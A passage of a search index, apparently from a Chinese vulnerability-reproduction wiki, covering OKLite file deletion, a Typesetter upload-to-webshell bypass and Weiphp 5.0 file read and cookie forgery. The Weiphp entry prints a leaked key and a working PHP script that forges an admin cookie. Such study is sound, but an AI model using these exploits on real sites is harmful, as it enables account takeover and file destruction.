\u8c03\u7528get\u51fd\u6570\u4f20\u5165\u53c2\u6570\u65f6\u662f\u5426\u6709\u5bf9 ../ \u7684\u8fc7\u6ee4 \u53ef\u4ee5\u770b\u5230\u53c2\u6570\u6211\u4eec\u662f\u53ef\u63a7\u7684\uff0c\u4f7f\u7528\u8fd9\u91cc\u7684\u6f0f\u6d1e\u8fdb\u884c\u4efb\u610f\u6587\u4ef6\u5220\u9664 \u6293\u5305\u4fee\u6539\u6210\u529f\u5220\u9664\u6587\u4ef6","title":"OKLite 1.2.25 \u540e\u53f0\u98ce\u683c\u6a21\u5757 \u4efb\u610f\u6587\u4ef6\u5220\u9664 CVE-2019-16132"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/OKLite/OKLite%201.2.25%20%E5%90%8E%E5%8F%B0%E9%A3%8E%E6%A0%BC%E6%A8%A1%E5%9D%97%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%20CVE-2019-16132/#oklite-1225-\u540e\u53f0\u98ce\u683c\u6a21\u5757-\u4efb\u610f\u6587\u4ef6\u5220\u9664-cve-2019-16132","text":"","title":"OKLite 1.2.25 \u540e\u53f0\u98ce\u683c\u6a21\u5757 \u4efb\u610f\u6587\u4ef6\u5220\u9664 CVE-2019-16132"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/OKLite/OKLite%201.2.25%20%E5%90%8E%E5%8F%B0%E9%A3%8E%E6%A0%BC%E6%A8%A1%E5%9D%97%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%20CVE-2019-16132/#\u6f0f\u6d1e\u63cf\u8ff0","text":"OKLite 1.2.25 \u540e\u53f0\u98ce\u683c\u6a21\u5757\u5b58\u5728 \u5bf9\u5371\u9669\u5b57\u7b26\u672a\u8fc7\u6ee4\uff0c\u5bfc\u81f4\u53ef\u4ee5\u5220\u9664\u4efb\u610f\u76ee\u5f55\u548c\u6587\u4ef6","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/OKLite/OKLite%201.2.25%20%E5%90%8E%E5%8F%B0%E9%A3%8E%E6%A0%BC%E6%A8%A1%E5%9D%97%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%20CVE-2019-16132/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] OKLite 1.2.25","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/OKLite/OKLite%201.2.25%20%E5%90%8E%E5%8F%B0%E9%A3%8E%E6%A0%BC%E6%A8%A1%E5%9D%97%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%20CVE-2019-16132/#\u6f0f\u6d1e\u590d\u73b0","text":"\u51fa\u73b0\u6f0f\u6d1e\u7684\u51fd\u6570\u5728\u6587\u4ef6 framework/admin/tpl_control.php \u4e2d\u7684 delfile_f() \u51fd\u6570 \u8fd9\u91cc\u5220\u9664\u6587\u4ef6\u4e3b\u8981\u8c03\u7528\u4e86 rm\u51fd\u6570 , \u4f4d\u7f6e\u5728 framework/libs/file.php /** * \u5220\u9664\u64cd\u4f5c\uff0c\u8bf7\u4e00\u5b9a\u8981\u5c0f\u5fc3\uff0c\u5728\u7a0b\u5e8f\u4e2d\u6700\u597d\u4e25\u683c\u4e00\u4e9b\uff0c\u4e0d\u7136\u6709\u53ef\u80fd\u5c06\u6574\u4e2a\u76ee\u5f55\u5220\u6389 * @\u53c2\u6570 $del \u8981\u5220\u9664\u7684\u6587\u4ef6\u6216\u6587\u4ef6\u5939 * @\u53c2\u6570 $type \u4ec5\u652f\u6301file\u548cfolder\uff0c\u4e3afile\u65f6\u4ec5\u5220\u9664$del\u6587\u4ef6\uff0c\u5982\u679c$del\u4e3a\u6587\u4ef6\u5939\uff0c\u8868\u793a\u5220\u9664\u5176\u4e0b\u9762\u7684\u6587\u4ef6\u3002\u4e3afolder\u65f6\uff0c\u8868\u793a\u5220\u9664$del\u8fd9\u4e2a\u6587\u4ef6\uff0c\u5982\u679c\u4e3a\u6587\u4ef6\u5939\uff0c\u8868\u793a\u5220\u9664\u6b64\u6587\u4ef6\u5939\u53ca\u5b50\u9879 * @\u8fd4\u56de true/false **/ public function rm($del,$type=\"file\") { if(!file_exists($del)){ return false; } if(is_file($del)){ unlink($del); return true; } $array = $this->_dir_list($del); if(!$array){ if($type == 'folder'){ rmdir($del); } return true; } foreach($array as $key=>$value){ if(file_exists($value)){ if(is_dir($value)){ $this->rm($value,$type); }else{ unlink($value); } } } if($type == \"folder\"){ rmdir($del); } return true; } \u8fd9\u91cc\u5bf9\u4f20\u5165\u7684\u53c2\u6570\u904d\u5386\uff0c\u83b7\u5f97\u7684\u6587\u4ef6\u540d\u6216\u6587\u4ef6\u5939\u8fdb\u884c\u5220\u9664 \u56de\u8fc7\u5934\u770b \u8c03\u7528get\u51fd\u6570\u4f20\u5165\u53c2\u6570\u65f6\u662f\u5426\u6709\u5bf9 ../ \u7684\u8fc7\u6ee4 \u53ef\u4ee5\u770b\u5230\u53c2\u6570\u6211\u4eec\u662f\u53ef\u63a7\u7684\uff0c\u4f7f\u7528\u8fd9\u91cc\u7684\u6f0f\u6d1e\u8fdb\u884c\u4efb\u610f\u6587\u4ef6\u5220\u9664 \u6293\u5305\u4fee\u6539\u6210\u529f\u5220\u9664\u6587\u4ef6","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/Typesetter/Typesetter%20CMS%205-5.1%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/","text":"Typesetter CMS 5-5.1 \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u53ef\u4ee5\u901a\u8fc7\u5c06.php\u653e\u5728.zip\u6587\u4ef6\u4e2d\u5e76\u89e3\u538b\u7f29\u6765\u7ed5\u8fc7\u5bf9.php\u6587\u4ef6\u7684\u4fdd\u62a4\u3002\u4e00\u65e6\u5b8c\u6210\uff0c\u5c31\u53ef\u4ee5\u4f7f\u7528\u6076\u610f\u7684php\u6587\u4ef6\uff08webshell\uff09\u5728\u8ba1\u7b97\u673a\u4e0a\u6267\u884c\u547d\u4ee4 \u5f71\u54cd\u7248\u672c \u00b6 [!NOTE] Typesetter CMS 5-5.1 \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u6309\u5982\u4e0b\u6b65\u9aa4\u590d\u73b0 \u53c2\u8003\u6587\u7ae0 \u00b6 Github \u7ed5\u8fc7\u6587\u4ef6\u4e0a\u4f20\u9650\u5236\u5bfc\u81f4\u547d\u4ee4\u6267\u884c","title":"Typesetter CMS 5-5.1 \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/Typesetter/Typesetter%20CMS%205-5.1%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/#typesetter-cms-5-51-\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20","text":"","title":"Typesetter CMS 5-5.1 \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/Typesetter/Typesetter%20CMS%205-5.1%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u53ef\u4ee5\u901a\u8fc7\u5c06.php\u653e\u5728.zip\u6587\u4ef6\u4e2d\u5e76\u89e3\u538b\u7f29\u6765\u7ed5\u8fc7\u5bf9.php\u6587\u4ef6\u7684\u4fdd\u62a4\u3002\u4e00\u65e6\u5b8c\u6210\uff0c\u5c31\u53ef\u4ee5\u4f7f\u7528\u6076\u610f\u7684php\u6587\u4ef6\uff08webshell\uff09\u5728\u8ba1\u7b97\u673a\u4e0a\u6267\u884c\u547d\u4ee4","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/Typesetter/Typesetter%20CMS%205-5.1%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/#\u5f71\u54cd\u7248\u672c","text":"[!NOTE] Typesetter CMS 5-5.1","title":"\u5f71\u54cd\u7248\u672c"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/Typesetter/Typesetter%20CMS%205-5.1%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/#\u6f0f\u6d1e\u590d\u73b0","text":"\u6309\u5982\u4e0b\u6b65\u9aa4\u590d\u73b0","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/Typesetter/Typesetter%20CMS%205-5.1%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/#\u53c2\u8003\u6587\u7ae0","text":"Github \u7ed5\u8fc7\u6587\u4ef6\u4e0a\u4f20\u9650\u5236\u5bfc\u81f4\u547d\u4ee4\u6267\u884c","title":"\u53c2\u8003\u6587\u7ae0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/Weiphp/Weiphp5.0%20%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7Cookie%E4%BC%AA%E9%80%A0%20CNVD-2021-09693/","text":"Weiphp5.0 \u4efb\u610f\u7528\u6237Cookie\u4f2a\u9020 CNVD-2021-09693 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 Weiphp5.0 \u5b58\u5728\u7ba1\u7406\u5458\u7528\u6237Cookie\u4f2a\u9020\uff0c\u901a\u8fc7\u6cc4\u9732\u7684\u5bc6\u94a5\u6570\u636e\uff0c\u53ef\u5229\u7528\u52a0\u5bc6\u65b9\u6cd5\u6765\u5f97\u5230\u7ba1\u7406\u5458\u7684Cookie \u5f71\u54cd\u7248\u672c \u00b6 [!NOTE] Weiphp <= 5.0 \u73af\u5883\u642d\u5efa \u00b6 weiphp5.0\u5b98\u65b9\u4e0b\u8f7d\u53c2\u8003\u624b\u518c \u53c2\u8003\u5b98\u65b9\u624b\u518c\u521b\u5efa\u7f51\u7ad9\u5373\u53ef \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u9996\u5148\u9700\u8981\u5f97\u5230\u6570\u636e\u5e93\u914d\u7f6e\u6587\u4ef6\u4e2d\u7684**data_auth_key**\u5bc6\u94a5 \u5f97\u5230\u8fd9\u4e2a\u914d\u7f6e\u6587\u4ef6\u53ef\u53c2\u7167\u4e0a\u4e00\u7bc7**Weiphp5.0 \u524d\u53f0\u6587\u4ef6\u4efb\u610f\u8bfb\u53d6** 'data_auth_key' => '+0SeoAC#YR,Jm&c?[PhUg9u;:Drd8Fj4q|XOkx*T' \u5168\u5c40\u67e5\u627e\u4e0b\u4f7f\u7528\u4e86\u8fd9\u4e2a\u5bc6\u94a5\u7684\u5730\u65b9 \u627e\u5230\u4e86\u8ddf\u636e\u8fd9\u4e2a\u5bc6\u94a5\u7684\u52a0\u5bc6\u65b9\u6cd5\u548c\u89e3\u5bc6\u65b9\u6cd5 \u52a0\u5bc6\u65b9\u6cd5 think_encrypt function think_encrypt($data, $key = '', $expire = 0) { $key = md5(empty($key) ? config('database.data_auth_key') : $key); $data = base64_encode($data); $x = 0; $len = strlen($data); $l = strlen($key); $char = ''; for ($i = 0; $i < $len; $i++) { if ($x == $l) { $x = 0; } $char .= substr($key, $x, 1); $x++; } $str = sprintf('%010d', $expire ? $expire + time() : 0); for ($i = 0; $i < $len; $i++) { $str .= chr(ord(substr($data, $i, 1)) + (ord(substr($char, $i, 1))) % 256); } return str_replace(array( '+', '/', '=' ), array( '-', '_', '' ), base64_encode($str)); } \u89e3\u5bc6\u65b9\u6cd5 think_decrypt function think_decrypt($data, $key = '') { $key = md5(empty($key) ? config('database.data_auth_key') : $key); $data = str_replace(array( '-', '_' ), array( '+', '/' ), $data); $mod4 = strlen($data) % 4; if ($mod4) { $data .= substr('====', $mod4); } $data = base64_decode($data); $expire = substr($data, 0, 10); $data = substr($data, 10); if ($expire > 0 && $expire < time()) { return ''; } $x = 0; $len = strlen($data); $l = strlen($key); $char = $str = ''; for ($i = 0; $i < $len; $i++) { if ($x == $l) { $x = 0; } $char .= substr($key, $x, 1); $x++; } for ($i = 0; $i < $len; $i++) { if (ord(substr($data, $i, 1)) < ord(substr($char, $i, 1))) { $str .= chr((ord(substr($data, $i, 1)) + 256) - ord(substr($char, $i, 1))); } else { $str .= chr(ord(substr($data, $i, 1)) - ord(substr($char, $i, 1))); } } return base64_decode($str); } \u5168\u5c40\u67e5\u770b\u4e0b\u4f7f\u7528\u4e86\u89e3\u5bc6\u65b9\u6cd5\u7684\u5730\u65b9 \u5728\u6587\u4ef6 application\\common.php \u4e2d\u542b\u6709\u4f7f\u7528\u89e3\u5bc6\u65b9\u6cd5\u7684\u4ee3\u7801\uff0c\u7528\u4e8e\u505a\u8eab\u4efd\u9a8c\u8bc1 function is_login() { $user = session('user_auth'); if (empty($user)) { $cookie_uid = cookie('user_id'); if (!empty($cookie_uid)) { $uid = think_decrypt($cookie_uid); $userinfo = getUserInfo($uid); D('common/User')->autoLogin($userinfo); $user = session('user_auth'); } } if (empty($user)) { return 0; } else { return session('user_auth_sign') == data_auth_sign($user) ? $user['uid'] : 0; } } \u6839\u636e\u8fd9\u91cc\u5f97\u5230\u7684\u4ee3\u7801\uff0c\u53ef\u4ee5\u77e5\u9053\u5f53**user_Id=1**\u65f6,\u4f1a\u89e3\u5bc6\u5bc6\u94a5\u540e\u5224\u65ad\u662f\u5426\u6b63\u786e\uff0c\u5982\u679c\u6b63\u786e\u5219\u53ef\u4ee5\u767b\u5f55\u7cfb\u7edf \u6211\u4eec\u5728\u672c\u5730\u4f7f\u7528\u52a0\u5bc6\u4ee3\u7801\u52a0\u5bc6**user_id=1**\u5f97\u5230\u7684cookie\u5219\u53ef\u4ee5\u767b\u5f55\u7cfb\u7edf <?php show_source ( __FILE__ ); function think_encrypt ( $data , $key = '' , $expire = 0 ) { $key = '+0SeoAC#YR,Jm&c?[PhUg9u;:Drd8Fj4q|XOkx*T' ; $key = md5 ( $key ); $data = base64_encode ( $data ); $x = 0 ; $len = strlen ( $data ); $l = strlen ( $key ); $char = '' ; for ( $i = 0 ; $i < $len ; $i ++ ) { if ( $x == $l ) { $x = 0 ; } $char .= substr ( $key , $x , 1 ); $x ++ ; } $str = sprintf ( '%010d' , $expire ? $expire + time () : 0 ); for ( $i = 0 ; $i < $len ; $i ++ ) { $str .= chr ( ord ( substr ( $data , $i , 1 )) + ( ord ( substr ( $char , $i , 1 ))) % 256 ); } return str_replace ( array ( '+' , '/' , '=' ), array ( '-' , '_' , '' ), base64_encode ( $str )); } echo 'user_id = ' . think_encrypt ( $_GET [ 'user_id' ]); ?> \u6dfb\u52a0**cookie: user_id=xxxxxxxx**\u5373\u53ef\u6210\u529f\u767b\u5f55 [!NOTE] \u83b7\u53d6\u5bc6\u94a5\u7684\u65b9\u6cd5\u53c2\u7167\u4e0a\u4e00\u7bc7\u5ba1\u8ba1\u6587\u7ae0","title":"Weiphp5.0 \u4efb\u610f\u7528\u6237Cookie\u4f2a\u9020 CNVD-2021-09693"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/Weiphp/Weiphp5.0%20%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7Cookie%E4%BC%AA%E9%80%A0%20CNVD-2021-09693/#weiphp50-\u4efb\u610f\u7528\u6237cookie\u4f2a\u9020-cnvd-2021-09693","text":"","title":"Weiphp5.0 \u4efb\u610f\u7528\u6237Cookie\u4f2a\u9020 CNVD-2021-09693"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/Weiphp/Weiphp5.0%20%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7Cookie%E4%BC%AA%E9%80%A0%20CNVD-2021-09693/#\u6f0f\u6d1e\u63cf\u8ff0","text":"Weiphp5.0 \u5b58\u5728\u7ba1\u7406\u5458\u7528\u6237Cookie\u4f2a\u9020\uff0c\u901a\u8fc7\u6cc4\u9732\u7684\u5bc6\u94a5\u6570\u636e\uff0c\u53ef\u5229\u7528\u52a0\u5bc6\u65b9\u6cd5\u6765\u5f97\u5230\u7ba1\u7406\u5458\u7684Cookie","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/Weiphp/Weiphp5.0%20%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7Cookie%E4%BC%AA%E9%80%A0%20CNVD-2021-09693/#\u5f71\u54cd\u7248\u672c","text":"[!NOTE] Weiphp <= 5.0","title":"\u5f71\u54cd\u7248\u672c"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/Weiphp/Weiphp5.0%20%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7Cookie%E4%BC%AA%E9%80%A0%20CNVD-2021-09693/#\u73af\u5883\u642d\u5efa","text":"weiphp5.0\u5b98\u65b9\u4e0b\u8f7d\u53c2\u8003\u624b\u518c \u53c2\u8003\u5b98\u65b9\u624b\u518c\u521b\u5efa\u7f51\u7ad9\u5373\u53ef","title":"\u73af\u5883\u642d\u5efa"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/Weiphp/Weiphp5.0%20%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7Cookie%E4%BC%AA%E9%80%A0%20CNVD-2021-09693/#\u6f0f\u6d1e\u590d\u73b0","text":"\u9996\u5148\u9700\u8981\u5f97\u5230\u6570\u636e\u5e93\u914d\u7f6e\u6587\u4ef6\u4e2d\u7684**data_auth_key**\u5bc6\u94a5 \u5f97\u5230\u8fd9\u4e2a\u914d\u7f6e\u6587\u4ef6\u53ef\u53c2\u7167\u4e0a\u4e00\u7bc7**Weiphp5.0 \u524d\u53f0\u6587\u4ef6\u4efb\u610f\u8bfb\u53d6** 'data_auth_key' => '+0SeoAC#YR,Jm&c?[PhUg9u;:Drd8Fj4q|XOkx*T' \u5168\u5c40\u67e5\u627e\u4e0b\u4f7f\u7528\u4e86\u8fd9\u4e2a\u5bc6\u94a5\u7684\u5730\u65b9 \u627e\u5230\u4e86\u8ddf\u636e\u8fd9\u4e2a\u5bc6\u94a5\u7684\u52a0\u5bc6\u65b9\u6cd5\u548c\u89e3\u5bc6\u65b9\u6cd5 \u52a0\u5bc6\u65b9\u6cd5 think_encrypt function think_encrypt($data, $key = '', $expire = 0) { $key = md5(empty($key) ? config('database.data_auth_key') : $key); $data = base64_encode($data); $x = 0; $len = strlen($data); $l = strlen($key); $char = ''; for ($i = 0; $i < $len; $i++) { if ($x == $l) { $x = 0; } $char .= substr($key, $x, 1); $x++; } $str = sprintf('%010d', $expire ? $expire + time() : 0); for ($i = 0; $i < $len; $i++) { $str .= chr(ord(substr($data, $i, 1)) + (ord(substr($char, $i, 1))) % 256); } return str_replace(array( '+', '/', '=' ), array( '-', '_', '' ), base64_encode($str)); } \u89e3\u5bc6\u65b9\u6cd5 think_decrypt function think_decrypt($data, $key = '') { $key = md5(empty($key) ? config('database.data_auth_key') : $key); $data = str_replace(array( '-', '_' ), array( '+', '/' ), $data); $mod4 = strlen($data) % 4; if ($mod4) { $data .= substr('====', $mod4); } $data = base64_decode($data); $expire = substr($data, 0, 10); $data = substr($data, 10); if ($expire > 0 && $expire < time()) { return ''; } $x = 0; $len = strlen($data); $l = strlen($key); $char = $str = ''; for ($i = 0; $i < $len; $i++) { if ($x == $l) { $x = 0; } $char .= substr($key, $x, 1); $x++; } for ($i = 0; $i < $len; $i++) { if (ord(substr($data, $i, 1)) < ord(substr($char, $i, 1))) { $str .= chr((ord(substr($data, $i, 1)) + 256) - ord(substr($char, $i, 1))); } else { $str .= chr(ord(substr($data, $i, 1)) - ord(substr($char, $i, 1))); } } return base64_decode($str); } \u5168\u5c40\u67e5\u770b\u4e0b\u4f7f\u7528\u4e86\u89e3\u5bc6\u65b9\u6cd5\u7684\u5730\u65b9 \u5728\u6587\u4ef6 application\\common.php \u4e2d\u542b\u6709\u4f7f\u7528\u89e3\u5bc6\u65b9\u6cd5\u7684\u4ee3\u7801\uff0c\u7528\u4e8e\u505a\u8eab\u4efd\u9a8c\u8bc1 function is_login() { $user = session('user_auth'); if (empty($user)) { $cookie_uid = cookie('user_id'); if (!empty($cookie_uid)) { $uid = think_decrypt($cookie_uid); $userinfo = getUserInfo($uid); D('common/User')->autoLogin($userinfo); $user = session('user_auth'); } } if (empty($user)) { return 0; } else { return session('user_auth_sign') == data_auth_sign($user) ? $user['uid'] : 0; } } \u6839\u636e\u8fd9\u91cc\u5f97\u5230\u7684\u4ee3\u7801\uff0c\u53ef\u4ee5\u77e5\u9053\u5f53**user_Id=1**\u65f6,\u4f1a\u89e3\u5bc6\u5bc6\u94a5\u540e\u5224\u65ad\u662f\u5426\u6b63\u786e\uff0c\u5982\u679c\u6b63\u786e\u5219\u53ef\u4ee5\u767b\u5f55\u7cfb\u7edf \u6211\u4eec\u5728\u672c\u5730\u4f7f\u7528\u52a0\u5bc6\u4ee3\u7801\u52a0\u5bc6**user_id=1**\u5f97\u5230\u7684cookie\u5219\u53ef\u4ee5\u767b\u5f55\u7cfb\u7edf <?php show_source ( __FILE__ ); function think_encrypt ( $data , $key = '' , $expire = 0 ) { $key = '+0SeoAC#YR,Jm&c?[PhUg9u;:Drd8Fj4q|XOkx*T' ; $key = md5 ( $key ); $data = base64_encode ( $data ); $x = 0 ; $len = strlen ( $data ); $l = strlen ( $key ); $char = '' ; for ( $i = 0 ; $i < $len ; $i ++ ) { if ( $x == $l ) { $x = 0 ; } $char .= substr ( $key , $x , 1 ); $x ++ ; } $str = sprintf ( '%010d' , $expire ? $expire + time () : 0 ); for ( $i = 0 ; $i < $len ; $i ++ ) { $str .= chr ( ord ( substr ( $data , $i , 1 )) + ( ord ( substr ( $char , $i , 1 ))) % 256 ); } return str_replace ( array ( '+' , '/' , '=' ), array ( '-' , '_' , '' ), base64_encode ( $str )); } echo 'user_id = ' . think_encrypt ( $_GET [ 'user_id' ]); ?> \u6dfb\u52a0**cookie: user_id=xxxxxxxx**\u5373\u53ef\u6210\u529f\u767b\u5f55 [!NOTE] \u83b7\u53d6\u5bc6\u94a5\u7684\u65b9\u6cd5\u53c2\u7167\u4e0a\u4e00\u7bc7\u5ba1\u8ba1\u6587\u7ae0","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/Weiphp/Weiphp5.0%20%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%8F%96%20CNVD-2020-68596/","text":"Weiphp5.0 \u524d\u53f0\u6587\u4ef6\u4efb\u610f\u8bfb\u53d6 CNVD-2020-68596 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 Weiphp5.0 \u5b58\u5728\u524d\u53f0\u6587\u4ef6\u4efb\u610f\u8bfb\u53d6\u6f0f\u6d1e\uff0c\u53ef\u4ee5\u8bfb\u53d6\u6570\u636e\u5e93\u914d\u7f6e\u7b49\u654f\u611f\u6587\u4ef6 \u5f71\u54cd\u7248\u672c \u00b6 [!NOTE] Weiphp <= 5.0 \u73af\u5883\u642d\u5efa \u00b6 weiphp5.0\u5b98\u65b9\u4e0b\u8f7d\u53c2\u8003\u624b\u518c \u53c2\u8003\u5b98\u65b9\u624b\u518c\u521b\u5efa\u7f51\u7ad9\u5373\u53ef \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u6f0f\u6d1e\u51fd\u6570\u6587\u4ef6: application\\material\\controller\\Material.php \u6f0f\u6d1e\u51fd\u6570: _download_imgage public function _download_imgage($media_id, $picUrl = '', $dd = null) { $savePath = SITE_PATH . '/public/uploads/picture/' . time_format(NOW_TIME, 'Y-m-d'); mkdirs($savePath); $cover_id = 0; if (empty($picUrl)) { // \u83b7\u53d6\u56fe\u7247URL $url = 'https://api.weixin.qq.com/cgi-bin/material/get_material?access_token=' . get_access_token(); $param['media_id'] = $media_id; // dump($url); $picContent = post_data($url, $param, 'json', false); $picjson = json_decode($picContent, true); // dump($picjson);die; if (isset($picjson['errcode']) && $picjson['errcode'] != 0) { $cover_id = do_down_image($media_id, $dd['thumb_url']); if (!$cover_id) { return 0; exit(); } } $picName = NOW_TIME . uniqid() . '.jpg'; $picPath = $savePath . '/' . $picName; $res = file_put_contents($picPath, $picContent); } else { $content = wp_file_get_contents($picUrl); // \u83b7\u53d6\u56fe\u7247\u6269\u5c55\u540d $picExt = substr($picUrl, strrpos($picUrl, '=') + 1); if (empty($picExt) || $picExt == 'jpeg' || strpos('jpg,gif,png,jpeg,bmp', $picExt) === false) { $picExt = 'jpg'; } $picName = NOW_TIME . uniqid() . '.' . $picExt; $picPath = $savePath . '/' . $picName; $res = file_put_contents($picPath, $content); if (!$res) { $cover_id = do_down_image($media_id); if (!$cover_id) { return 0; exit(); } } } if ($res) { $file = array( 'name' => $picName, 'type' => 'application/octet-stream', 'tmp_name' => $picPath, 'size' => $res, 'error' => 0 ); $File = D('home/Picture'); $cover_id = $File->addFile($file); } return $cover_id; } \u9996\u5148\u6ce8\u610f\u5230\u51fd\u6570\u7684\u6807\u8bc6\u4e3a**public**\uff0c\u4e5f\u5c31\u662f\u8fd9\u4e2a\u51fd\u6570\u662f\u516c\u5171\u8c03\u7528\u7684\uff0c\u5e76\u4e14\u53d8\u91cf**picUrl**\u4e3a\u53ef\u63a7\u53d8\u91cf \u6839\u636e\u4ee3\u7801\u4ece\u4e0a\u5411\u4e0b\u5206\u6790 $savePath = SITE_PATH . '/public/uploads/picture/' . time_format(NOW_TIME, 'Y-m-d'); \u53d8\u91cf$savePath**\u786e\u5b9a\u6587\u4ef6\u4e0a\u4f20\u540e\u7684\u7f13\u5b58\u4f4d\u7f6e\u4e3a /public/uploads/picture/ \uff0c\u5e76\u6309\u7167**\u5e74-\u6708-\u65e5 \u521b\u5efa\u6587\u4ef6\u5939 \u5411\u4e0b\u5bf9\u53d8\u91cf**$picUrl** \u662f\u5426\u4e3a\u7a7a\u8fdb\u884c\u5224\u65ad\uff0c\u5e76\u5224\u65ad\u662f\u5426\u8fdb\u884c\u767b\u5f55\uff0c\u8fd9\u91cc\u4f7f\u7528**POST**\u4f20\u53c2\u8fdb\u884c\u9a8c\u8bc1\u767b\u5f55\u7ed5\u8fc7\uff0c\u8df3\u8f6c\u5230else\u8bed\u53e5\u4e0b else { $content = wp_file_get_contents($picUrl); // \u83b7\u53d6\u56fe\u7247\u6269\u5c55\u540d $picExt = substr($picUrl, strrpos($picUrl, '=') + 1); if (empty($picExt) || $picExt == 'jpeg' || strpos('jpg,gif,png,jpeg,bmp', $picExt) === false) { $picExt = 'jpg'; } $picName = NOW_TIME . uniqid() . '.' . $picExt; $picPath = $savePath . '/' . $picName; $res = file_put_contents($picPath, $content); if (!$res) { $cover_id = do_down_image($media_id); if (!$cover_id) { return 0; exit(); } } \u5206\u6790\u4f20\u5165\u53d8\u91cf picUrl \u7684 **wp_file_get_contents**\u65b9\u6cd5 $content = wp_file_get_contents($picUrl); \u51fd\u6570\u6587\u4ef6\u4f4d\u7f6e application\\common.php \u53ef\u4ee5\u770b\u5230\u8fd9\u91cc\u6ca1\u6709\u5bf9\u6211\u4eec\u7684\u53c2\u6570\u8fdb\u884c\u8fc7\u6ee4\uff0c\u53ea\u505a\u4e86\u4e00\u4e2a\u6709\u5173\u8d85\u65f6\u7684\u64cd\u4f5c, \u56de\u5230\u51fd\u6570\u7ee7\u7eed\u5411\u4e0b\u5206\u6790 $picExt = substr($picUrl, strrpos($picUrl, '=') + 1); if (empty($picExt) || $picExt == 'jpeg' || strpos('jpg,gif,png,jpeg,bmp', $picExt) === false) { $picExt = 'jpg'; } $picName = NOW_TIME . uniqid() . '.' . $picExt; $picPath = $savePath . '/' . $picName; $res = file_put_contents($picPath, $content); \u8fd9\u91cc\u521b\u5efa\u4e86\u6709\u5173\u5f53\u524d\u65f6\u95f4\u7684\u56fe\u7247\u6587\u4ef6\uff0c\u5e76\u5199\u5165\u6587\u4ef6\u5939**/public/uploads/picture/** \u4e0b \u6211\u4eec\u5148\u5c1d\u8bd5\u63a7\u5236\u53d8\u91cf $picUrl 